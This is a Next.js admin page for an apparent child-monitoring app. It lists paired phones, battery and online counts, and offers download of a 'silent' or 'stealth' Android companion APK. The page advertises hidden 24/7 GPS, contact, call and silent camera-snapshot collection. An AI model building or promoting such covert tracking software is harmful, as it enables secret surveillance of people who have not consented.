// app/admin/devices/page.tsx
"use client";

import React, { useEffect, useState, useCallback } from "react";
import { MonitoredDevice } from "@/lib/device-types";
import { DeviceOverviewCard } from "@/components/admin/devices/DeviceOverviewCard";
import { AddDeviceModal } from "@/components/admin/devices/AddDeviceModal";
import { ApkDownloadModal } from "@/components/admin/devices/ApkDownloadModal";
import { PairingGuideTooltip } from "@/components/admin/devices/PairingGuideTooltip";
import { Tooltip } from "@/components/ui/Tooltip";
import { Button } from "@/components/ui/Button";
import { Smartphone, Plus, RefreshCw, Shield, Download, Radio } from "lucide-react";

export default function AdminDevicesPage() {
  const [devices, setDevices] = useState<MonitoredDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [modalOpen, setModalOpen] = useState(false);
  const [apkModalOpen, setApkModalOpen] = useState(false);

  const fetchDevices = useCallback(async () => {
    try {
      const res = await fetch("/api/devices");
      const data = await res.json();
      if (res.ok && data.devices) {
        setDevices(data.devices);
      }
    } catch (err) {
      console.error("Failed to load devices", err);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchDevices();
    const interval = setInterval(fetchDevices, 12000);
    return () => clearInterval(interval);
  }, [fetchDevices]);

  const onlineCount = devices.filter((d) => d.is_online).length;
  const lowBatteryCount = devices.filter((d) => d.battery_level <= 20).length;

  return (
    <div className="space-y-6">
      {/* Header: Anti-Clash Single Row with Responsive Width Buttons */}
      <div className="space-y-1.5 sm:space-y-2">
        <div className="flex items-center justify-between gap-1.5 sm:gap-3 w-full">
          {/* Title with Live Badge: Compact & Scaled to fit */}
          <div className="flex items-center gap-1 sm:gap-2 min-w-0">
            <h1 className="text-sm sm:text-lg md:text-2xl font-black text-slate-900 dark:text-white tracking-tight flex items-center gap-1 sm:gap-1.5 truncate">
              <Smartphone className="w-4 h-4 sm:w-5 sm:h-5 md:w-6 md:h-6 text-amber-600 dark:text-[#FFFC00] shrink-0" />
              <span className="truncate">Kid&apos;s Devices</span>
            </h1>
            <span className="inline-flex items-center gap-0.5 sm:gap-1 px-1.5 sm:px-2.5 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-600 dark:text-emerald-400 text-[9px] sm:text-[11px] font-bold shrink-0">
              <Radio className="w-2 h-2 sm:w-2.5 sm:h-2.5 md:w-3 md:h-3 animate-pulse" />
              <span className="hidden xs:inline">Live</span>
            </span>
          </div>

          {/* Action Buttons: Responsive Widths & Never Wrap or Clashing */}
          <div className="flex items-center gap-1 sm:gap-1.5 md:gap-2 shrink-0">
            <Button
              variant="glass"
              size="sm"
              onClick={fetchDevices}
              disabled={loading}
              className="h-7 w-7 sm:h-8 sm:w-8 md:h-9 md:w-9 p-0 rounded-full border-slate-200 dark:border-white/10 text-slate-700 dark:text-white/70 hover:text-slate-900 dark:hover:text-white shrink-0 flex items-center justify-center"
              title="Refresh Devices"
            >
              <RefreshCw className={`w-3 h-3 sm:w-3.5 sm:h-3.5 ${loading ? "animate-spin" : ""}`} />
            </Button>

            <PairingGuideTooltip />

            <Tooltip
              content="Direct download or copy link for the silent Android companion APK."
              placement="bottom"
              widthClass="w-[calc(100vw-2rem)] max-w-xs sm:w-60"
            >
              <Button
                variant="secondary"
                size="sm"
                onClick={() => setApkModalOpen(true)}
                className="h-7 sm:h-8 md:h-9 px-2 sm:px-3 md:px-3.5 rounded-full border-slate-200 dark:border-white/10 text-slate-800 dark:text-white hover:border-[#FFFC00]/50 shrink-0 text-[10px] sm:text-xs font-bold"
              >
                <Download className="w-3 h-3 sm:w-3.5 sm:h-3.5 mr-0.5 sm:mr-1 text-amber-600 dark:text-[#FFFC00]" />
                <span className="sm:hidden">APK</span>
                <span className="hidden sm:inline">Get APK</span>
              </Button>
            </Tooltip>

            <Button
              size="sm"
              onClick={() => setModalOpen(true)}
              className="h-7 sm:h-8 md:h-9 px-2 sm:px-3 md:px-4 rounded-full shadow-lg shadow-yellow-500/20 font-bold shrink-0 text-[10px] sm:text-xs"
            >
              <Plus className="w-3 h-3 sm:w-3.5 sm:h-3.5 mr-0.5 stroke-[2.5]" />
              <span className="sm:hidden">Add</span>
              <span className="hidden sm:inline">Register Device</span>
            </Button>
          </div>
        </div>

        {/* Subtitle spans full width underneath without pushing buttons */}
        <p className="text-slate-500 dark:text-white/50 text-[11px] sm:text-xs md:text-sm leading-relaxed">
          Realtime multi-device monitoring hub for your children. 24/7 background GPS, contacts, calls, and silent camera snapshots.
        </p>
      </div>

      {/* Metrics Row: Responsive Native Box Style */}
      <div className="grid grid-cols-3 gap-1.5 sm:gap-4">
        <div className="p-2 sm:p-5 rounded-xl sm:rounded-3xl bg-slate-50 dark:bg-white/[0.03] border border-slate-200/80 dark:border-white/10 shadow-sm dark:shadow-none flex flex-col justify-between transition-all">
          <span className="text-[9px] sm:text-xs font-semibold text-slate-500 dark:text-white/50 tracking-wide uppercase truncate">
            <span className="sm:hidden">Kids</span>
            <span className="hidden sm:inline">Total Kids</span>
          </span>
          <span className="text-base sm:text-3xl font-black text-slate-900 dark:text-white mt-1 sm:mt-2 tracking-tight">
            {devices.length}
          </span>
        </div>

        <div className="p-2 sm:p-5 rounded-xl sm:rounded-3xl bg-slate-50 dark:bg-white/[0.03] border border-slate-200/80 dark:border-white/10 shadow-sm dark:shadow-none flex flex-col justify-between transition-all">
          <span className="text-[9px] sm:text-xs font-semibold text-slate-500 dark:text-white/50 tracking-wide uppercase truncate">
            <span className="sm:hidden">Online</span>
            <span className="hidden sm:inline">Online Devices</span>
          </span>
          <span className="text-base sm:text-3xl font-black text-emerald-600 dark:text-emerald-400 mt-1 sm:mt-2 tracking-tight">
            {onlineCount}
          </span>
        </div>

        <div className="p-2 sm:p-5 rounded-xl sm:rounded-3xl bg-slate-50 dark:bg-white/[0.03] border border-slate-200/80 dark:border-white/10 shadow-sm dark:shadow-none flex flex-col justify-between transition-all">
          <span className="text-[9px] sm:text-xs font-semibold text-slate-500 dark:text-white/50 tracking-wide uppercase truncate">
            <span className="sm:hidden">Low Batt</span>
            <span className="hidden sm:inline">Low Battery (&le;20%)</span>
          </span>
          <span className={`text-base sm:text-3xl font-black mt-1 sm:mt-2 tracking-tight ${lowBatteryCount > 0 ? "text-red-500" : "text-slate-700 dark:text-white/60"}`}>
            {lowBatteryCount}
          </span>
        </div>
      </div>

      {/* Devices Grid */}
      {devices.length === 0 && !loading ? (
        <div className="p-8 sm:p-14 rounded-3xl bg-slate-50 dark:bg-white/[0.02] border border-slate-200 dark:border-white/10 text-center max-w-md mx-auto my-6 sm:my-10 shadow-sm dark:shadow-none">
          <div className="w-16 h-16 rounded-3xl bg-amber-500/10 dark:bg-[#FFFC00]/15 border-2 border-amber-500/30 dark:border-[#FFFC00] flex items-center justify-center mx-auto mb-4 shadow-lg shadow-yellow-500/10">
            <Shield className="w-8 h-8 text-amber-600 dark:text-[#FFFC00]" />
          </div>
          <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-1.5 tracking-tight">No Devices Connected Yet</h3>
          <p className="text-slate-500 dark:text-white/50 text-xs mb-6 leading-relaxed">
            Register your first child&apos;s device to get a pairing code, then install the stealth companion app on their phone.
          </p>
          <Button onClick={() => setModalOpen(true)} className="w-full h-11 rounded-full font-bold shadow-lg shadow-yellow-500/20">
            <Plus className="w-4 h-4 mr-1.5" />
            Register First Device
          </Button>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {devices.map((device) => (
            <DeviceOverviewCard
              key={device.id}
              device={device}
              onRefresh={fetchDevices}
            />
          ))}
        </div>
      )}

      {/* Add Device Modal */}
      <AddDeviceModal
        isOpen={modalOpen}
        onClose={() => setModalOpen(false)}
        onSuccess={fetchDevices}
      />

      {/* APK Download & Instructions Modal */}
      <ApkDownloadModal
        isOpen={apkModalOpen}
        onClose={() => setApkModalOpen(false)}
      />
    </div>
  );
}
